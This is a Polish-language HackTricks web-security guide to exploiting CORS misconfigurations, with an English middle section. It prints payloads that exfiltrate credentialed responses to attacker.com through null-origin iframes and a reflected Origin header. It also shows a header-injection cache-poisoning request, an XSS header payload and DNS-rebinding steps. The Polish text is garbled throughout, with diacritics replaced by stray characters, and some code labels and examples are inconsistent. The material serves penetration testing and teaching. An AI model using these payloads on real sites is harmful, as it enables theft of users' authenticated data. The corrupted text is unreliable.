# CORS - Bdy w konfiguracji i obejcie

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si trikami hackingowymi, przesyajc PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Czym jest CORS?

Cross-Origin Resource Sharing (CORS) standard **umo偶liwia serwerom okrelenie, kto mo偶e uzyska dostp do ich zasob贸w** oraz **kt贸re metody 偶da HTTP s dozwolone** z zewntrznych 藕r贸de.

Polityka **same-origin** wymaga, aby **serwer 偶dajcy** zasobu i serwer hostujcy **zas贸b** dzieliy ten sam protok贸 (np. `http://`), nazw domeny (np. `internal-web.com`) oraz **port** (np. 80). Zgodnie z t polityk, tylko strony internetowe z tej samej domeny i portu maj dostp do zasob贸w.

Zastosowanie polityki same-origin w kontekcie `http://normal-website.com/example/example.html` ilustruje si nastpujco:

| Uzyskany URL                              | Czy dostp dozwolony?                  |
| ----------------------------------------- | --------------------------------------- |
| `http://normal-website.com/example/`      | Tak: Identyczny schemat, domena i port |
| `http://normal-website.com/example2/`     | Tak: Identyczny schemat, domena i port |
| `https://normal-website.com/example/`     | Nie: Inne schemat i port                |
| `http://en.normal-website.com/example/`   | Nie: Inna domena                       |
| `http://www.normal-website.com/example/`  | Nie: Inna domena                       |
| `http://normal-website.com:8080/example/` | Nie: Inny port\*                       |

\*Internet Explorer ignoruje numer portu przy egzekwowaniu polityki same-origin, co pozwala na ten dostp.

### Nag贸wek `Access-Control-Allow-Origin`

Ten nag贸wek mo偶e zezwala na **wiele 藕r贸de**, warto **`null`** lub znak wieloznaczny **`*`**. Jednak **偶aden przegldarka nie obsuguje wielu 藕r贸de**, a u偶ycie znaku wieloznacznego `*` podlega **ograniczeniom**. (Znak wieloznaczny musi by u偶ywany samodzielnie, a jego u偶ycie razem z `Access-Control-Allow-Credentials: true` nie jest dozwolone.)

Ten nag贸wek jest **wydawany przez serwer** w odpowiedzi na 偶danie zasobu z innej domeny zainicjowane przez stron internetow, przy czym przegldarka automatycznie dodaje nag贸wek `Origin`.

### Nag贸wek `Access-Control-Allow-Credentials`

Zasadniczo, 偶dania midzydomenowe s realizowane bez powiadcze, takich jak ciasteczka czy nag贸wek Authorization. Jednak serwer z innej domeny mo偶e zezwoli na odczyt odpowiedzi, gdy powiadczenia s wysyane, ustawiajc nag贸wek `Access-Control-Allow-Credentials` na **`true`**.

Jeli ustawiony na `true`, przegldarka przeka偶e powiadczenia (ciasteczka, nag贸wki autoryzacji lub certyfikaty klienta TLS).
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### CSRF Pre-flight request

### Zrozumienie 偶da wstpnych w komunikacji midzydomenowej

Kiedy inicjowane jest 偶danie midzydomenowe w okrelonych warunkach, takich jak u偶ycie **niestandardowej metody HTTP** (czegokolwiek innego ni偶 HEAD, GET, POST), wprowadzenie nowych **nag贸wk贸w** lub zastosowanie specjalnej **wartoci nag贸wka Content-Type**, mo偶e by wymagane 偶danie wstpne. To wstpne 偶danie, wykorzystujce metod **`OPTIONS`**, ma na celu poinformowanie serwera o zamiarach nadchodzcego 偶dania midzydomenowego, w tym o metodach HTTP i nag贸wkach, kt贸re zamierza u偶y.

Protok贸 **Cross-Origin Resource Sharing (CORS)** wymaga tego sprawdzenia wstpnego, aby okreli wykonalno 偶danej operacji midzydomenowej, weryfikujc dozwolone metody, nag贸wki oraz wiarygodno 藕r贸da. Aby uzyska szczeg贸owe informacje na temat warunk贸w, kt贸re omijaj potrzeb 偶dania wstpnego, zapoznaj si z obszernym przewodnikiem dostarczonym przez [**Mozilla Developer Network (MDN)**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests).

Wa偶ne jest, aby zauwa偶y, 偶e **brak 偶dania wstpnego nie znosi wymogu, aby odpowied藕 zawieraa nag贸wki autoryzacji**. Bez tych nag贸wk贸w przegldarka jest niezdolna do przetworzenia odpowiedzi z 偶dania midzydomenowego.

Rozwa偶 nastpujcy przykad 偶dania wstpnego majcego na celu u偶ycie metody `PUT` wraz z niestandardowym nag贸wkiem o nazwie `Special-Request-Header`:
```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```
W odpowiedzi serwer mo偶e zwr贸ci nag贸wki wskazujce akceptowane metody, dozwolony origin oraz inne szczeg贸y polityki CORS, jak pokazano poni偶ej:
```markdown
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
* **`Access-Control-Allow-Headers`**: Ten nag贸wek okrela, kt贸re nag贸wki mog by u偶ywane podczas rzeczywistego 偶dania. Jest ustawiany przez serwer, aby wskaza dozwolone nag贸wki w 偶daniach od klienta.
* **`Access-Control-Expose-Headers`**: Dziki temu nag贸wkowi serwer informuje klienta, kt贸re nag贸wki mog by ujawnione jako cz odpowiedzi opr贸cz prostych nag贸wk贸w odpowiedzi.
* **`Access-Control-Max-Age`**: Ten nag贸wek wskazuje, jak dugo wyniki 偶dania wstpnego mog by buforowane. Serwer ustawia maksymalny czas, w sekundach, przez kt贸ry informacje zwr贸cone przez 偶danie wstpne mog by ponownie u偶ywane.
* **`Access-Control-Request-Headers`**: U偶ywany w 偶daniach wstpnych, ten nag贸wek jest ustawiany przez klienta, aby poinformowa serwer, kt贸re nag贸wki HTTP klient chce u偶y w rzeczywistym 偶daniu.
* **`Access-Control-Request-Method`**: Ten nag贸wek, r贸wnie偶 u偶ywany w 偶daniach wstpnych, jest ustawiany przez klienta, aby wskaza, kt贸ra metoda HTTP bdzie u偶ywana w rzeczywistym 偶daniu.
* **`Origin`**: Ten nag贸wek jest automatycznie ustawiany przez przegldark i wskazuje pochodzenie 偶dania midzy 藕r贸dami. Jest u偶ywany przez serwer do oceny, czy nadchodzce 偶danie powinno by dozwolone czy odrzucone na podstawie polityki CORS.

Nale偶y zauwa偶y, 偶e zazwyczaj (w zale偶noci od typu zawartoci i ustawionych nag贸wk贸w) w **偶daniu GET/POST nie jest wysyane 偶danie wstpne** (偶danie jest wysyane **bezporednio**), ale jeli chcesz uzyska dostp do **nag贸wk贸w/ciaa odpowiedzi**, musi ono zawiera nag贸wek _Access-Control-Allow-Origin_, kt贸ry to umo偶liwia.\
**Dlatego CORS nie chroni przed CSRF (ale mo偶e by pomocny).**

### **呕dania w lokalnej sieci 呕danie wstpne**

1. **`Access-Control-Request-Local-Network`**: Ten nag贸wek jest doczany do 偶dania klienta, aby zaznaczy, 偶e zapytanie jest skierowane do zasobu w lokalnej sieci. Su偶y jako znacznik informujcy serwer, 偶e 偶danie pochodzi z lokalnej sieci.
2. **`Access-Control-Allow-Local-Network`**: W odpowiedzi serwery wykorzystuj ten nag贸wek, aby zakomunikowa, 偶e 偶dany zas贸b mo偶e by udostpniony podmiotom spoza lokalnej sieci. Dziaa jako zielone wiato dla udostpniania zasob贸w w r贸偶nych granicach sieci, zapewniajc kontrolowany dostp przy zachowaniu protoko贸w bezpieczestwa.

**Wa偶na odpowied藕 zezwalajca na 偶danie lokalnej sieci** musi r贸wnie偶 zawiera w odpowiedzi nag贸wek `Access-Controls-Allow-Local_network: true`:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
Zauwa偶, 偶e adres IP linux **0.0.0.0** dziaa, aby **obej** te wymagania dotyczce dostpu do localhost, poniewa偶 ten adres IP nie jest uwa偶any za "lokalny".

Mo偶liwe jest r贸wnie偶 **obejcie wymaga dotyczcych sieci lokalnej**, jeli u偶yjesz **publicznego adresu IP lokalnego punktu kocowego** (jak publiczny adres IP routera). Poniewa偶 w wielu przypadkach, nawet jeli **publiczny IP** jest u偶ywany, jeli jest **z sieci lokalnej**, dostp zostanie przyznany.
{% endhint %}

## Wykorzystywalne bdne konfiguracje

Zaobserwowano, 偶e ustawienie `Access-Control-Allow-Credentials` na **`true`** jest warunkiem wstpnym dla wikszoci **prawdziwych atak贸w**. To ustawienie pozwala przegldarce na wysyanie powiadcze i odczytywanie odpowiedzi, co zwiksza skuteczno ataku. Bez tego korzy z wydania 偶dania przez przegldark w por贸wnaniu do zrobienia tego samodzielnie maleje, poniewa偶 wykorzystanie ciasteczek u偶ytkownika staje si niemo偶liwe.

### Wyjtek: Wykorzystywanie lokalizacji sieciowej jako uwierzytelnienia

Istnieje wyjtek, w kt贸rym lokalizacja sieciowa ofiary dziaa jako forma uwierzytelnienia. Umo偶liwia to wykorzystanie przegldarki ofiary jako proxy, omijajc uwierzytelnienie oparte na IP w celu uzyskania dostpu do aplikacji intranetowych. Metoda ta ma podobne skutki do DNS rebinding, ale jest prostsza do wykorzystania.

### Odbicie `Origin` w `Access-Control-Allow-Origin`

Scenariusz z rzeczywistego wiata, w kt贸rym warto nag贸wka `Origin` jest odbijana w `Access-Control-Allow-Origin`, jest teoretycznie mao prawdopodobny z powodu ogranicze dotyczcych czenia tych nag贸wk贸w. Jednak deweloperzy, kt贸rzy chc wczy CORS dla wielu adres贸w URL, mog dynamicznie generowa nag贸wek `Access-Control-Allow-Origin`, kopiujc warto nag贸wka `Origin`. To podejcie mo偶e wprowadza luki, szczeg贸lnie gdy atakujcy u偶ywa domeny o nazwie zaprojektowanej tak, aby wydawaa si wiarygodna, wprowadzajc w bd logik walidacji.
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### Wykorzystywanie `null` Origin

`null` origin, okrelony w sytuacjach takich jak przekierowania lub lokalne pliki HTML, zajmuje unikaln pozycj. Niekt贸re aplikacje dodaj t origin do biaej listy, aby uatwi lokalny rozw贸j, nieumylnie pozwalajc ka偶dej stronie internetowej na naladowanie `null` origin za pomoc osadzonego iframe, co omija ograniczenia CORS.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### Techniki Obejcia Wyra偶e Regularnych

Kiedy napotykasz na bia list domen, kluczowe jest testowanie mo偶liwoci obejcia, takich jak dodawanie domeny atakujcego do dozwolonej domeny lub wykorzystywanie luk w przejciu subdomen. Dodatkowo, wyra偶enia regularne u偶ywane do walidacji domen mog pomija niuanse w konwencjach nazewnictwa domen, co stwarza dalsze mo偶liwoci obejcia.

### Zaawansowane Obejcia Wyra偶e Regularnych

Wzorce Regex zazwyczaj koncentruj si na znakach alfanumerycznych, kropkach (.) i mylnikach (-), zaniedbujc inne mo偶liwoci. Na przykad, nazwa domeny stworzona w celu uwzgldnienia znak贸w interpretowanych inaczej przez przegldarki i wzorce regex mo偶e obej kontrole bezpieczestwa. Obsuga znak贸w podkrelenia w subdomenach przez Safari, Chrome i Firefox ilustruje, jak takie rozbie偶noci mog by wykorzystywane do obejcia logiki walidacji domen.

**Aby uzyska wicej informacji i ustawienia tego sprawdzenia obejcia:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **i** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![https://miro.medium.com/v2/resize:fit:720/format:webp/1\*rolEK39-DDxeBgSq6KLKAA.png](<../.gitbook/assets/image (284).png>)

### Z XSS wewntrz subdomeny

Programici czsto wdra偶aj mechanizmy obronne, aby chroni przed wykorzystaniem CORS, poprzez bia list domen, kt贸re maj prawo 偶da informacji. Pomimo tych rodk贸w ostro偶noci, bezpieczestwo systemu nie jest niezawodne. Obecno nawet jednej podatnej subdomeny w dozwolonych domenach mo偶e otworzy drzwi do wykorzystania CORS poprzez inne luki, takie jak XSS (Cross-Site Scripting).

Aby to zobrazowa, rozwa偶 scenariusz, w kt贸rym domena `requester.com` jest umieszczona na biaej licie, aby uzyska dostp do zasob贸w z innej domeny, `provider.com`. Konfiguracja po stronie serwera mo偶e wyglda mniej wicej tak:
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com') {
// Access data
} else {
// Unauthorized access
}
```
W tej konfiguracji wszystkie subdomeny `requester.com` maj dostp. Jednak jeli subdomena, powiedzmy `sub.requester.com`, jest skompromitowana z powodu podatnoci XSS, atakujcy mo偶e wykorzysta t sabo. Na przykad, atakujcy z dostpem do `sub.requester.com` m贸gby wykorzysta podatno XSS, aby obej polityki CORS i zoliwie uzyska dostp do zasob贸w na `provider.com`.

### **Zatrucie pamici podrcznej po stronie serwera**

[**Z tych bada**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

Mo偶liwe jest, 偶e poprzez wykorzystanie zatrucia pamici podrcznej po stronie serwera za pomoc wstrzykiwania nag贸wk贸w HTTP, mo偶na wywoa przechowywan podatno Cross-Site Scripting (XSS). Taki scenariusz ma miejsce, gdy aplikacja nie oczyszcza nag贸wka `Origin` z nielegalnych znak贸w, co tworzy podatno szczeg贸lnie dla u偶ytkownik贸w Internet Explorera i Edge. Te przegldarki traktuj (0x0d) jako prawidowy terminator nag贸wka HTTP, co prowadzi do podatnoci na wstrzykiwanie nag贸wk贸w HTTP.

Rozwa偶 nastpujce 偶danie, w kt贸rym nag贸wek `Origin` jest manipulowany:
```
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```
Internet Explorer i Edge interpretuj odpowied藕 jako:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```
While directly exploiting this vulnerability by making a web browser send a malformed header is not feasible, a crafted request can be manually generated using tools like Burp Suite. This method could lead to a server-side cache saving the response and inadvertently serving it to others. The crafted payload aims to alter the page's character set to UTF-7, a character encoding often associated with XSS vulnerabilities due to its ability to encode characters in a way that can be executed as script in certain contexts.

For further reading on stored XSS vulnerabilities, see [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored).

**Note**: The exploitation of HTTP header injection vulnerabilities, particularly through server-side cache poisoning, underscores the critical importance of validating and sanitizing all user-supplied input, including HTTP headers. Always employ a robust security model that includes input validation to prevent such vulnerabilities.

### **Client-Side cache poisoning**

[**From this research**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

In this scenario, an instance of a web page reflecting the contents of a custom HTTP header without proper encoding is observed. Specifically, the web page reflects back the contents included in a `X-User-id` header, which could include malicious JavaScript, as demonstrated by the example where the header contains an SVG image tag designed to execute JavaScript code on load.

Cross-Origin Resource Sharing (CORS) policies allow for the sending of custom headers. However, without the response being directly rendered by the browser due to CORS restrictions, the utility of such an injection might seem limited. The critical point arises when considering the browser's cache behavior. If the `Vary: Origin` header is not specified, it becomes possible for the malicious response to be cached by the browser. Subsequently, this cached response could be rendered directly when navigating to the URL, bypassing the need for direct rendering upon the initial request. This mechanism enhances the reliability of the attack by leveraging client-side caching.

To illustrate this attack, a JavaScript example is provided, designed to be executed in the environment of a web page, such as through a JSFiddle. This script performs a simple action: it sends a request to a specified URL with a custom header containing the malicious JavaScript. Upon successful request completion, it attempts to navigate to the target URL, potentially triggering the execution of the injected script if the response has been cached without proper handling of the `Vary: Origin` header.

Here's a summarized breakdown of the JavaScript used to execute this attack:
```html
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
req.send();
</script>
```
## Bypass

### XSSI (Cross-Site Script Inclusion) / JSONP

XSSI, znane r贸wnie偶 jako Cross-Site Script Inclusion, to rodzaj podatnoci, kt贸ra wykorzystuje fakt, 偶e zasada tej samej lokalizacji (SOP) nie ma zastosowania podczas doczania zasob贸w za pomoc tagu skryptu. Dzieje si tak, poniewa偶 skrypty musz by w stanie by doczane z r贸偶nych domen. Ta podatno pozwala atakujcemu uzyska dostp i odczyta dowoln tre, kt贸ra zostaa doczona za pomoc tagu skryptu.

Ta podatno staje si szczeg贸lnie istotna w przypadku dynamicznego JavaScript lub JSONP (JSON z Padding), zwaszcza gdy informacje o autoryzacji, takie jak ciasteczka, s u偶ywane do uwierzytelniania. Podczas 偶dania zasobu z innego hosta ciasteczka s doczane, co czyni je dostpnymi dla atakujcego.

Aby lepiej zrozumie i zagodzi t podatno, mo偶esz u偶y wtyczki BurpSuite dostpnej pod adresem [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp). Ta wtyczka mo偶e pom贸c w identyfikacji i rozwizaniu potencjalnych podatnoci XSSI w Twoich aplikacjach internetowych.

[**Przeczytaj wicej o r贸偶nych typach XSSI i jak je wykorzysta tutaj.**](xssi-cross-site-script-inclusion.md)

Spr贸buj doda **`callback`** **parameter** do 偶dania. Mo偶e strona bya przygotowana do wysyania danych jako JSONP. W takim przypadku strona zwr贸ci dane z `Content-Type: application/javascript`, co obejdzie polityk CORS.

![](<../.gitbook/assets/image (856).png>)

### atwy (bezu偶yteczny?) bypass

Jednym ze sposob贸w na obejcie ograniczenia `Access-Control-Allow-Origin` jest poproszenie aplikacji internetowej o wykonanie 偶dania w Twoim imieniu i odesanie odpowiedzi. Jednak w tym scenariuszu dane uwierzytelniajce ostatecznej ofiary nie bd wysyane, poniewa偶 偶danie jest kierowane do innej domeny.

1. [**CORS-escape**](https://github.com/shalvah/cors-escape): To narzdzie zapewnia proxy, kt贸re przekazuje Twoje 偶danie wraz z jego nag贸wkami, jednoczenie faszujc nag贸wek Origin, aby pasowa do 偶danej domeny. To skutecznie omija polityk CORS. Oto przykad u偶ycia z XMLHttpRequest:
2. [**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape): To narzdzie oferuje alternatywne podejcie do proxy 偶da. Zamiast przekazywa Twoje 偶danie w oryginalnej formie, serwer wykonuje wasne 偶danie z okrelonymi parametrami.

### Bypass Iframe + Popup

Mo偶esz **obej kontrole CORS** takie jak `e.origin === window.origin` poprzez **utworzenie iframe** i **otwarcie nowego okna z niego**. Wicej informacji na nastpnej stronie:

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### DNS Rebinding poprzez TTL

DNS rebinding poprzez TTL to technika u偶ywana do obejcia niekt贸rych rodk贸w bezpieczestwa poprzez manipulacj rekordami DNS. Oto jak to dziaa:

1. Atakujcy tworzy stron internetow i sprawia, 偶e ofiara uzyskuje do niej dostp.
2. Atakujcy nastpnie zmienia DNS (IP) swojej domeny, aby wskazywa na stron ofiary.
3. Przegldarka ofiary buforuje odpowied藕 DNS, kt贸ra mo偶e mie warto TTL (Time to Live) wskazujc, jak dugo rekord DNS powinien by uwa偶any za wa偶ny.
4. Gdy TTL wygasa, przegldarka ofiary wykonuje nowe 偶danie DNS, co pozwala atakujcemu na wykonanie kodu JavaScript na stronie ofiary.
5. Utrzymujc kontrol nad IP ofiary, atakujcy mo偶e zbiera informacje z ofiary bez wysyania jakichkolwiek ciasteczek do serwera ofiary.

Wa偶ne jest, aby zauwa偶y, 偶e przegldarki maj mechanizmy buforowania, kt贸re mog uniemo偶liwi natychmiastowe nadu偶ycie tej techniki, nawet przy niskich wartociach TTL.

DNS rebinding mo偶e by przydatny do obejcia jawnych kontroli IP wykonywanych przez ofiar lub w scenariuszach, w kt贸rych u偶ytkownik lub bot pozostaje na tej samej stronie przez du偶szy czas, co pozwala na wyganicie bufora.

Jeli potrzebujesz szybkiego sposobu na nadu偶ycie DNS rebinding, mo偶esz skorzysta z usug takich jak [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html).

Aby uruchomi wasny serwer DNS rebinding, mo偶esz wykorzysta narzdzia takie jak **DNSrebinder** ([https://github.com/mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSrebinder)). To polega na wystawieniu lokalnego portu 53/udp, utworzeniu rekordu A wskazujcego na niego (np. ns.example.com) oraz utworzeniu rekordu NS wskazujcego na wczeniej utworzony subdomen A (np. ns.example.com). Ka偶da subdomena subdomeny ns.example.com bdzie nastpnie rozwizywana przez Tw贸j host.

Mo偶esz r贸wnie偶 zbada publicznie dziaajcy serwer pod adresem [http://rebind.it/singularity.html](http://rebind.it/singularity.html) w celu dalszego zrozumienia i eksperymentowania.

### DNS Rebinding poprzez **DNS Cache Flooding**

DNS rebinding poprzez DNS cache flooding to kolejna technika u偶ywana do obejcia mechanizmu buforowania przegldarek i wymuszenia drugiego 偶dania DNS. Oto jak to dziaa:

1. Pocztkowo, gdy ofiara wykonuje 偶danie DNS, otrzymuje odpowied藕 z adresem IP atakujcego.
2. Aby obej obron buforowania, atakujcy wykorzystuje service worker. Service worker zalewa pami podrczn DNS, co skutecznie usuwa zbuforowan nazw serwera atakujcego.
3. Gdy przegldarka ofiary wykonuje drugie 偶danie DNS, otrzymuje teraz odpowied藕 z adresem IP 127.0.0.1, kt贸ry zazwyczaj odnosi si do localhosta.

Zalewajc pami podrczn DNS za pomoc service worker, atakujcy mo偶e manipulowa procesem rozwizywania DNS i zmusi przegldark ofiary do wykonania drugiego 偶dania, tym razem rozwizujc do po偶danego adresu IP atakujcego.

### DNS Rebinding poprzez **Cache**

Innym sposobem na obejcie obrony buforowania jest wykorzystanie wielu adres贸w IP dla tej samej subdomeny u dostawcy DNS. Oto jak to dziaa:

1. Atakujcy ustawia dwa rekordy A (lub jeden rekord A z dwoma IP) dla tej samej subdomeny u dostawcy DNS.
2. Gdy przegldarka sprawdza te rekordy, otrzymuje oba adresy IP.
3. Jeli przegldarka zdecyduje si najpierw u偶y adresu IP atakujcego, atakujcy mo偶e dostarczy adunek, kt贸ry wykonuje 偶dania HTTP do tej samej domeny.
4. Jednak gdy atakujcy uzyska adres IP ofiary, przestaje odpowiada na przegldark ofiary.
5. Przegldarka ofiary, zdajc sobie spraw, 偶e domena nie odpowiada, przechodzi do u偶ycia drugiego podanego adresu IP.
6. Uzyskujc dostp do drugiego adresu IP, przegldarka omija zasad tej samej lokalizacji (SOP), co pozwala atakujcemu na nadu偶ycie tego i zbieranie oraz eksfiltracj informacji.

Ta technika wykorzystuje zachowanie przegldarek, gdy dla domeny podawane s wiele adres贸w IP. Poprzez strategiczne kontrolowanie odpowiedzi i manipulowanie wyborem adresu IP przez przegldark, atakujcy mo偶e wykorzysta SOP i uzyska dostp do informacji od ofiary.

{% hint style="warning" %}
Zauwa偶, 偶e aby uzyska dostp do localhost, powiniene spr贸bowa ponownie powiza **127.0.0.1** w Windows i **0.0.0.0** w Linux.\
Dostawcy tacy jak godaddy czy cloudflare nie pozwolili mi u偶ywa IP 0.0.0.0, ale AWS route53 pozwoli mi utworzy jeden rekord A z 2 IP, z kt贸rych jednym byo "0.0.0.0"

<img src="../.gitbook/assets/image (140).png" alt="" data-size="original">
{% endhint %}

Aby uzyska wicej informacji, mo偶esz sprawdzi [https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/)

### Inne powszechne obejcia

* Jeli **wewntrzne IP nie s dozwolone**, mog **zapomnie o zakazaniu 0.0.0.0** (dziaa na Linuxie i Macu)
* Jeli **wewntrzne IP nie s dozwolone**, odpowiedz z **CNAME** do **localhost** (dziaa na Linuxie i Macu)
* Jeli **wewntrzne IP nie s dozwolone** jako odpowiedzi DNS, mo偶esz odpowiedzie **CNAME do wewntrznych usug** takich jak www.corporate.internal.

### DNS Rebidding Weaponized

Mo偶esz znale藕 wicej informacji na temat poprzednich technik obejcia i jak u偶ywa nastpujcego narzdzia w wykadzie [Gerald Doussot - Stan atak贸w DNS Rebinding & Singularity of Origin - Konferencja DEF CON 27](https://www.youtube.com/watch?v=y9-0lICNjOQ).

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) to narzdzie do przeprowadzania atak贸w [DNS rebinding](https://en.wikipedia.org/wiki/DNS\_rebinding). Zawiera niezbdne komponenty do ponownego powizania adresu IP nazwy serwera DNS ataku z adresem IP docelowej maszyny oraz do dostarczania adunk贸w atakujcych w celu wykorzystania podatnego oprogramowania na docelowej maszynie.

### Rzeczywista ochrona przed DNS Rebinding

* U偶ywaj TLS w usugach wewntrznych
* 呕daj uwierzytelnienia, aby uzyska dostp do danych
* Waliduj nag贸wek Host
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/): Propozycja, aby zawsze wysya 偶danie wstpne, gdy publiczne serwery chc uzyska dostp do serwer贸w wewntrznych

## **Narzdzia**

**Fuzz mo偶liwe bdne konfiguracje w politykach CORS**

* [https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8](https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8)
* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)
* [https://github.com/omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne)

## Odniesienia

* [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
* [https://portswigger.net/web-security/cors/access-control-allow-origin](https://portswigger.net/web-security/cors/access-control-allow-origin)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS)
* [https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [https://www.codecademy.com/articles/what-is-cors](https://www.codecademy.com/articles/what-is-cors)
* [https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors](https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors)
* [https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646](https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
* [https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b](https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
